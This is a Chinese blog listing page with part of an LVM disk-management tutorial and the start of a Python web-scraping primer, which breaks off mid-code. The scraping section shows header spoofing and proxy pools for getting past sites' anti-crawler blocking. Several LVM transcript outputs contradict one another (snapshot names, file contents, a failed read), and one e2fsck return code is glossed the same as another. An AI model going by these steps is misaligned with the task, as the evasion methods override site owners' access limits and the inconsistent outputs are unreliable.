<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# echo &quot;this is a test for LVM&quot;&gt; LG&#x2F;test</span><br><span class="line"></span><br><span class="line">#在挂载的逻辑卷里添加数据，用来测试在逻辑卷扩容是否会破坏原有数据</span><br><span class="line">[root@node1 ~]# cat LG&#x2F;test </span><br><span class="line">this is a test for LVM</span><br><span class="line"></span><br><span class="line">#扩容逻辑卷LV1，增加2G空间容量（从对应的卷组中划分空间容量）</span><br><span class="line">[root@node1 ~]# lvextend -L +2G &#x2F;dev&#x2F;V1&#x2F;LV1 </span><br><span class="line">  Size of logical volume V1&#x2F;LV1 changed from 1.00 GiB (256 extents) to 3.00 GiB (768 extents).</span><br><span class="line">  Logical volume V1&#x2F;LV1 successfully resized.</span><br><span class="line">[root@node1 ~]# lvs</span><br><span class="line">  LV   VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  LV1  V1     -wi-ao----   3.00g                                                    </span><br><span class="line">  LV2  V2     -wi-a-----   1.00g                                                    </span><br><span class="line">  root centos -wi-ao---- &lt;17.00g                                                    </span><br><span class="line">  swap centos -wi-ao----   2.00g                                                    </span><br><span class="line"></span><br><span class="line">#使用resize2fs命令来进行确认增加容量，前面的步骤只是初步分配，还不能实际使用，</span><br><span class="line">#需要此步骤来确定实际分配使用</span><br><span class="line">[root@node1 ~]# resize2fs &#x2F;dev&#x2F;V1&#x2F;LV1 </span><br><span class="line">resize2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem at &#x2F;dev&#x2F;V1&#x2F;LV1 is mounted on &#x2F;root&#x2F;LG; on-line resizing required</span><br><span class="line">old_desc_blocks &#x3D; 1, new_desc_blocks &#x3D; 1</span><br><span class="line">The filesystem on &#x2F;dev&#x2F;V1&#x2F;LV1 is now 786432 blocks long.</span><br><span class="line"></span><br><span class="line">#xfs系统确认实际使用的命令</span><br><span class="line">#xfs_growfs &#x2F;dev&#x2F;VGtest1&#x2F;LVtest1</span><br><span class="line"></span><br><span class="line">#数据并没有受损</span><br><span class="line">[root@node1 ~]# cat LG&#x2F;test </span><br><span class="line">this is a test for LVM</span><br></pre></td></tr></table></figure>



<h2 id="缩减逻辑卷"><a href="#缩减逻辑卷" class="headerlink" title="缩减逻辑卷"></a>缩减逻辑卷</h2><p>缩减逻辑卷的注意事项：<br>1、查看逻辑卷使用空间状况<br>2、不能在线缩减，得先卸载 切记<br>3、确保缩减后的空间大小依然能存储原有的所有数据<br>4、在缩减之前应该先强行检查文件，以确保文件系统处于一至性状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#处于挂载状态的LV逻辑卷无法强制检查</span><br><span class="line">[root@node1 ~]# umount &#x2F;dev&#x2F;V1&#x2F;LV1 </span><br><span class="line">[root@node1 ~]# e2fsck -f &#x2F;dev&#x2F;V1&#x2F;LV1 </span><br><span class="line">e2fsck 1.42.9 (28-Dec-2013)</span><br><span class="line">Pass 1: Checking inodes, blocks, and sizes</span><br><span class="line">Pass 2: Checking directory structure</span><br><span class="line">Pass 3: Checking directory connectivity</span><br><span class="line">Pass 4: Checking reference counts</span><br><span class="line">Pass 5: Checking group summary information</span><br><span class="line">&#x2F;dev&#x2F;V1&#x2F;LV1: 12&#x2F;196608 files (0.0% non-contiguous), 21309&#x2F;786432 blocks</span><br><span class="line"></span><br><span class="line">#首先需要确定缩减逻辑卷到多大空间容量，-1G表示缩减1G大小，1G表示缩减至1G，再进行逻辑卷LV容量缩减</span><br><span class="line">[root@node1 ~]# lvreduce -L 1G &#x2F;dev&#x2F;V1&#x2F;LV1 </span><br><span class="line">  WARNING: Reducing active logical volume to 1.00 GiB.</span><br><span class="line">  THIS MAY DESTROY YOUR DATA (filesystem etc.)</span><br><span class="line">Do you really want to reduce V1&#x2F;LV1? [y&#x2F;n]: y</span><br><span class="line">  Size of logical volume V1&#x2F;LV1 changed from 3.00 GiB (768 extents) to 1.00 GiB (256 extents).</span><br><span class="line">  Logical volume V1&#x2F;LV1 successfully resized.</span><br><span class="line"></span><br><span class="line">#之后需要重新挂载逻辑卷</span><br></pre></td></tr></table></figure>



<h2 id="缩减磁盘空间"><a href="#缩减磁盘空间" class="headerlink" title="缩减磁盘空间"></a>缩减磁盘空间</h2><p>发现物理磁盘空间使用不足，将其中一块硬盘或分区拿掉，避免磁盘浪费</p>
<p>1、pvmove /dev/sdb1 #将/dev/sdb1上存储的数据移到其它物理卷中</p>
<p>2、vgreduce VGtest /dev/sdb1 #将/dev/sdb1从VGtest卷组中移除</p>
<p>3、pvremove /dev/sdb1 #将/dev/sdb1从物理卷上移除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# pvs</span><br><span class="line">  PV         VG     Fmt  Attr PSize   PFree  </span><br><span class="line">  &#x2F;dev&#x2F;sda2  centos lvm2 a--  &lt;19.00g      0 </span><br><span class="line">  &#x2F;dev&#x2F;sdb1  V1     lvm2 a--   &lt;5.00g  &lt;4.00g</span><br><span class="line">  &#x2F;dev&#x2F;sdb2  V2     lvm2 a--  &lt;15.00g &lt;14.00g</span><br><span class="line">  &#x2F;dev&#x2F;sdc1  V1     lvm2 a--   &lt;5.00g  &lt;5.00g</span><br><span class="line">  &#x2F;dev&#x2F;sdc5  V2     lvm2 a--  &lt;15.00g &lt;15.00g</span><br><span class="line">  &#x2F;dev&#x2F;sdd1         lvm2 ---    5.00g   5.00g</span><br><span class="line">  </span><br><span class="line">#把sdb1磁盘分区的数据转移到其它磁盘上  </span><br><span class="line">[root@node1 ~]# pvmove &#x2F;dev&#x2F;sdb1 </span><br><span class="line">  &#x2F;dev&#x2F;sdb1: Moved: 43.36%</span><br><span class="line">  &#x2F;dev&#x2F;sdb1: Moved: 100.00%</span><br><span class="line">  </span><br><span class="line">#把分区sdb1从VG卷组中移除</span><br><span class="line">[root@node1 ~]# vgreduce V1 &#x2F;dev&#x2F;sdb1</span><br><span class="line">  Removed &quot;&#x2F;dev&#x2F;sdb1&quot; from volume group &quot;V1&quot;</span><br><span class="line">  </span><br><span class="line">#把sdb1分区从PV物理卷中释放出来</span><br><span class="line">[root@node1 ~]# pvremove &#x2F;dev&#x2F;sdb1</span><br><span class="line">  Labels on physical volume &quot;&#x2F;dev&#x2F;sdb1&quot; successfully wiped.</span><br><span class="line">[root@node1 ~]# cat LG&#x2F;test</span><br><span class="line">cat: LG&#x2F;test: No such file or directory</span><br><span class="line"></span><br><span class="line">#如果磁盘划分了多个分区，做成多个物理卷加入了卷组，那么可以能重复以上步骤，把所有的空间都从卷组和物理卷中释放，然后可以拿走这块磁盘做它用</span><br></pre></td></tr></table></figure>



<p>重新把/dev/sdb1加入到V1中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# pvcreate &#x2F;dev&#x2F;sdb1</span><br><span class="line">  Physical volume &quot;&#x2F;dev&#x2F;sdb1&quot; successfully created.</span><br><span class="line">[root@node1 ~]# vgs</span><br><span class="line">  VG     #PV #LV #SN Attr   VSize   VFree </span><br><span class="line">  V1       1   1   0 wz--n-  &lt;5.00g &lt;4.00g</span><br><span class="line">  V2       2   1   0 wz--n-  29.99g 28.99g</span><br><span class="line">  centos   1   2   0 wz--n- &lt;19.00g     0 </span><br><span class="line">[root@node1 ~]# vgextend V1 &#x2F;dev&#x2F;sdb1</span><br><span class="line">  Volume group &quot;V1&quot; successfully extended</span><br></pre></td></tr></table></figure>



<h2 id="LVM快照"><a href="#LVM快照" class="headerlink" title="LVM快照"></a>LVM快照</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 LG]# df -h</span><br><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs                 475M     0  475M   0% &#x2F;dev</span><br><span class="line">tmpfs                    487M     0  487M   0% &#x2F;dev&#x2F;shm</span><br><span class="line">tmpfs                    487M  7.7M  479M   2% &#x2F;run</span><br><span class="line">tmpfs                    487M     0  487M   0% &#x2F;sys&#x2F;fs&#x2F;cgroup</span><br><span class="line">&#x2F;dev&#x2F;mapper&#x2F;centos-root   17G  2.1G   15G  12% &#x2F;</span><br><span class="line">&#x2F;dev&#x2F;sda1               1014M  176M  839M  18% &#x2F;boot</span><br><span class="line">tmpfs                     98M     0   98M   0% &#x2F;run&#x2F;user&#x2F;0</span><br><span class="line">&#x2F;dev&#x2F;mapper&#x2F;V1-LV1       976M  2.6M  907M   1% &#x2F;appdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#利用LV1逻辑卷，快照形成一个备份的物理卷BackUp（逻辑卷快照功能）</span><br><span class="line">[root@node1 LG]# lvcreate -L 20M -n BackUp -s -p r &#x2F;dev&#x2F;V1&#x2F;LV1</span><br><span class="line">  Logical volume &quot;BackUp&quot; created.</span><br><span class="line">[root@node1 LG]# lvs</span><br><span class="line">  LV        VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  LV1       V1     owi-aos---   1.00g                                                    </span><br><span class="line">  thirdBack V1     sri-aos---  20.00m      LV1    0.06                                   </span><br><span class="line">  LV2       V2     -wi-a-----   1.00g                                                    </span><br><span class="line">  root      centos -wi-ao---- &lt;17.00g                                                    </span><br><span class="line">  swap      centos -wi-ao----   2.00g    </span><br><span class="line">[root@node1 LG]# mkdir &#x2F;tmp&#x2F;thirdUp </span><br><span class="line">[root@node1 LG]# mount &#x2F;dev&#x2F;V1&#x2F;thirdBack &#x2F;tmp&#x2F;thirdUp&#x2F; #把快照的逻辑卷挂载到目录上</span><br><span class="line">mount: &#x2F;dev&#x2F;mapper&#x2F;V1-thirdBack is write-protected, mounting read-only</span><br><span class="line">[root@node1 LG]# cat &#x2F;tmp&#x2F;thirdUp&#x2F;lvm </span><br><span class="line">this is the LVM test</span><br></pre></td></tr></table></figure>

<p>删除LVM快照</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# lvremove &#x2F;dev&#x2F;V1&#x2F;backup</span><br><span class="line">Do you really want to remove active logical volume V1&#x2F;backup? [y&#x2F;n]: y</span><br><span class="line">  Logical volume &quot;backup&quot; successfully removed</span><br></pre></td></tr></table></figure>



<h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">知识扩展</span><br><span class="line">resize2fs命令</span><br><span class="line">resize2fs命令被用来增大或者收缩未加载的“ext2&#x2F;ext3”文件系统的大小。如果文件系统是处于mount状态下，那么它只能做到扩容，前提条件是内核支持在线resize。，linux kernel 2.6支持在mount状态下扩容但仅限于ext3文件系统。</span><br><span class="line">-d：打开调试特性；</span><br><span class="line">-p：打印已完成的百分比进度条；</span><br><span class="line">-f：强制执行调整大小操作，覆盖掉安全检查操作；</span><br><span class="line">-F：开始执行调整大小前，刷新文件系统设备的缓冲区</span><br><span class="line">如果是xfs文件系统，则需要使用xfs_growfs命令</span><br><span class="line">e2fsck命令</span><br><span class="line">e2fsck是检查ext2、ext3、ext4等文件系统的正确性。</span><br><span class="line">补充说明：</span><br><span class="line">e2fsck执行后的传回值及代表意义如下：</span><br><span class="line">0 没有任何错误发生。</span><br><span class="line">1 文件系统发生错误，并且已经修正。</span><br><span class="line">2 文件系统发生错误，并且已经修正。</span><br><span class="line">4 文件系统发生错误，但没有修正。</span><br><span class="line">8 运作时发生错误。</span><br><span class="line">16 使用的语法发生错误。</span><br><span class="line">128 共享的函数库发生错误。</span><br><span class="line">参　数：</span><br><span class="line">-a 不询问使用者意见，便自动修复文件系统。</span><br><span class="line">-b &lt;superblock&gt; 指定superblock，而不使用预设的superblock。</span><br><span class="line">-B &lt;区块大小&gt; 指定区块的大小，单位为字节。</span><br><span class="line">-c 一并执行badblocks，以标示损坏的区块。</span><br><span class="line">-C 将检查过程的信息完整记录在file descriptor中，使得整个检查过程都能完整监控。</span><br><span class="line">-d 显示排错信息。</span><br><span class="line">-f 即使文件系统没有错误迹象，仍强制地检查正确性。</span><br><span class="line">-F 执行前先清除设备的缓冲区。</span><br><span class="line">-l &lt;文件&gt; 将文件中指定的区块加到损坏区块列表。</span><br><span class="line">-L &lt;文件&gt; 先清除损坏区块列表，再将文件中指定的区块加到损坏区块列表。因此损坏区块列表的区块跟文件中指定的区块是一样的。</span><br><span class="line">-n 以只读模式开启文件系统，并采取非互动方式执行，所有的问题对话均设置以&quot;no&quot;回答。</span><br><span class="line">-p 不询问使用者意见，便自动修复文件系统。</span><br><span class="line">-r 此参数只为了兼容性而存在，并无实际作用。</span><br><span class="line">-s 如果文件系统的字节顺序不适当，就交换字节顺序，否则不做任何动作。</span><br><span class="line">-S 不管文件系统的字节顺序，一律交换字节顺序。</span><br><span class="line">-t 显示时间信息。</span><br><span class="line">-v 执行时显示详细的信息。</span><br><span class="line">-V 显示版本信息。</span><br><span class="line">-y 采取非互动方式执行，所有的问题均设置以&quot;yes&quot;回答。</span><br></pre></td></tr></table></figure>


            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/12/25/Linux%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/12/25/Linux%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8/" title="Linux系统存储">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/5.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/">
    		Python爬虫大纲概述
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-10-21T04:37:03.000Z">2019-10-21</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>爬虫的本质是：程序模拟浏览器，对服务器发起访问(requests请求过程)，服务器返回响应(response响应过程)。所以，一个简单的爬虫只有三步：</p>
<ul>
<li>构造URL</li>
<li>对服务器发送请求</li>
<li>输出服务器返回内容</li>
</ul>
<p><img src="https://i.loli.net/2019/10/21/H5xcmP18p32n4Ml.png" alt="爬虫"></p>
<p>这里用一个实例，运行后可以看到输出了百度网页的源码(这里就不演示了)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment"># requests是python爬虫最常用的请求库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span> <span class="comment">#1、指名要访问的网站</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url) <span class="comment">#2、使用requests的get方法请求网站信息</span></span><br><span class="line"></span><br><span class="line">print(response.text) <span class="comment">#3、输出响应内容</span></span><br></pre></td></tr></table></figure>

<p>所以，爬虫也都围绕这三步进行。<br>1、构造URL，就是要爬的链接<br>2、发起请求<br>3、解析响应内容</p>
<h1 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h1><p>可能有人会问，指定URL这么简单，为什么也要写，这里笔者给出一个实例说明：<br>这是东方财富网的腾讯股票页面，如果我想要爬取这个页面的评价，那么我就需要知道评论的URL。<br><br></p>
<p><img src="https://i.loli.net/2019/10/21/SGNEoJWLYUOI4ce.png" alt="东方财富网腾讯股"></p>
<br>
这个页面有94条评论地址，一共有196个这样的页，也就是我需要知道至少18,424‬个URL我才能把腾讯股票所有的评率全部爬下来，这显然是不现实的。那么我们是如何知道要爬页面的URL的呢？答案是：通过网站的内部逻辑构造URL。
<br>

<p><img src="https://i.loli.net/2019/10/21/Z71H6caJ3X5mRkI.png" alt="评论数"></p>
<br>
通过Chrome开发者选项可以调出如下页面，指定一条评论链接，我们可以看到红圈画出来的内容:`/news,usaapl,880272132.html`
<br>


<p><img src="https://i.loli.net/2019/10/21/wA7Ssiqh6FQRpzr.png" alt="网站结构"></p>
<br>
然后我们再点进去，看看这个站点的真正链接是什么。
<br>


<p><img src="https://i.loli.net/2019/10/21/2yRfnFKUPDvz4kV.png" alt="站点链接"></p>
<p>可以看到，这个站点的真正链接是:</p>
<blockquote>
<p><a href="http://guba.eastmoney.com/news,usaapl,880272132.html" target="_blank" rel="noopener">http://guba.eastmoney.com/news,usaapl,880272132.html</a></p>
</blockquote>
<p>而我们之前找到了<code>/news,usaapl,880272132.html</code>，这个站点的真正链接，就是在这段之前拼接：<code>http://guba.eastmoney.com</code>。</p>
<p>所以，我们只需要把一开始的网站爬下来，然后筛选出类似<code>/news,usaapl,880272132.html</code>这样的内容，然后再把它和<code>http://guba.eastmoney.com</code>拼接，就可以得到当前页面上所有评论的具体地址，这就是地址构造，也就是构造URL。</p>
<h1 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h1><p>一个爬虫是否能成功将网页爬下来，完全取决于请求。现在网络上绝大部分的网站都有了反爬机制，能够拦截爬虫。</p>
<p>这里解释一下为什么要有反爬。爬虫抓取网页就相当于用户访问网页，在这期间，浏览器对服务器发起了一次访问。如果爬虫大量的抓取网页，比如在一分钟之内抓取了一万次网页，那么就相当于访问了服务器一万次，这样就会大量的占据服务器的资源，甚至大型分布式爬虫会使服务器崩溃。然而，人类是不可能做到10000次/min的访问量的(其实相当于一分钟内刷新一个网页10000次)。所以，越来越多的网站设计了反爬，将低访问量的人和高访问量的爬虫区别开来，让人能够正常访问，而爬虫则拒之门外。目前主要通过以下方式实现反爬：</p>
<ul>
<li>识别用户的User-Agent</li>
<li>使用Ajax请求</li>
<li>使用JavaScript渲染内容</li>
<li>对IP进行访问控制</li>
<li>对URL进行加密处理</li>
<li>构造复杂的请求头(往往是请求头需要额外添加网站的其他参数，这些参数分布在网站的隐蔽角落，而且几乎毫无逻辑)</li>
</ul>
<h2 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h2><p>这里笔者给出一个豆瓣电影榜的例子，首先用户需要先在浏览器中找到自己浏览器的请求头，具体操作如下：</p>
<ul>
<li>打开浏览器</li>
<li>进入开发者模式，谷歌浏览器是按F12</li>
<li>Ctrl+R刷新页面</li>
<li>选择Network的选项</li>
<li>点击右边的任意一个</li>
<li>左边选择Headers，下拉可以看到User-Agent</li>
<li>将其复制到代码中即可，代码如下：</li>
</ul>
<p><img src="https://i.loli.net/2019/10/21/Hov87YuORg5tV2y.png" alt="User-Agent"></p>
<br>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"><span class="comment"># 添加请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers=headers) <span class="comment"># 这里要把请求头送入到请求方法中</span></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<br>


<p><img src="https://i.loli.net/2019/10/21/cjQvBVMePmbh8TF.png" alt="豆瓣图书榜源码"></p>
<br>
绝大多数网站，不加请求头，往往加载不了全部网页内容。
<br>

<h2 id="添加data"><a href="#添加data" class="headerlink" title="添加data"></a>添加data</h2><p>data和User-Agent的作用类似，都是用来伪装成用户的。服务器会根据有没有data和user-agent来判断是否是爬虫还是用户。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://httpbin.org/get'</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'germet'</span>,</span><br><span class="line"><span class="string">'age'</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response=requests.get(url,data=data)<span class="comment">#或者是params</span></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="克制Ajax和JavaScript"><a href="#克制Ajax和JavaScript" class="headerlink" title="克制Ajax和JavaScript"></a>克制Ajax和JavaScript</h2><p>使用selenium首先要安装selenium库，<code>pip install selenium -i https://pypi.tuna.tsinghua.edu.cn/simple</code>。<br>其次，如果是用selenium打开Chrome，还需要安装ChromeDriver驱动。淘宝源ChromeDriver驱动链接，注意版本要和当前Chrome的版本一致。</p>
<blockquote>
<p><a href="http://npm.taobao.org/mirrors/chromedriver/" target="_blank" rel="noopener">http://npm.taobao.org/mirrors/chromedriver/</a></p>
</blockquote>
<p>目前Chrome支持的浏览器有<code>Safari、FireFox、Chrome</code>等，且都需要安装浏览器驱动。</p>
<p>selenium会自动打开浏览器，然后渲染出网页，再关闭浏览器，这样可以克制一切JavaScript渲染，如果想针对Ajax请求，可以用Selenium模拟点击效果，这里只介绍基础的用法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">option = webdriver.ChromeOptions() <span class="comment"># 添加Chrome打开的选项</span></span><br><span class="line"><span class="comment">#option.add_argument('--headless')  # 执行时不打开了浏览器，通常在没有面板的Linux服务器中会用到</span></span><br><span class="line">driver = webdriver.Chrome(options=option)</span><br><span class="line"></span><br><span class="line">driver.get(url) </span><br><span class="line">driver.close() <span class="comment">#关闭浏览器</span></span><br></pre></td></tr></table></figure>

<h2 id="代理IP"><a href="#代理IP" class="headerlink" title="代理IP"></a>代理IP</h2><p>一个IP地址对服务器过于频繁的访问，会导致服务器屏蔽你的IP地址。爬虫通常使用代理IP池来处理自己IP被封的情况。</p>
<p>可以使用Github上已经写好的代理池</p>
<blockquote>
<p><a href="https://github.com/jhao104/proxy_pool" target="_blank" rel="noopener">https://github.com/jhao104/proxy_pool</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">proxy=&#123;</span><br><span class="line">    <span class="string">'http'</span>:<span class="string">'http://127.0.0.1:9743'</span>,</span><br><span class="line">    <span class="string">'https'</span>:<span class="string">'https://127.0.0.1:9743'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response=requests.get(url,proxies=proxy)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h2 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h2><p>通常用于访问一些地方较远的网站，或者访问的网站当前过于繁忙，可以设置超时。一旦请求时间超过一定的值，服务器还没有返回响应，那么就直接退出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,timeout=<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">except</span> ReadTimeout:</span><br><span class="line">    print(<span class="string">'Timeout'</span>)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>requests还可以用来下载各种文件，比如图片、音乐、视频等。这里用一个例子演示一下：</p>
<p>下载《雨幕》这首歌：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'https://sharefs.yun.kugou.com/201910211352/d2b8f1ce854a7f4d01937583ee35b46e/G172/M00/0D/14/jJQEAF2hoIGATyZ4ADq0vjCqr7Q097.mp3'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url) <span class="comment"># 这里要把请求头送入到请求方法中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存到文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'雨幕.mp3'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    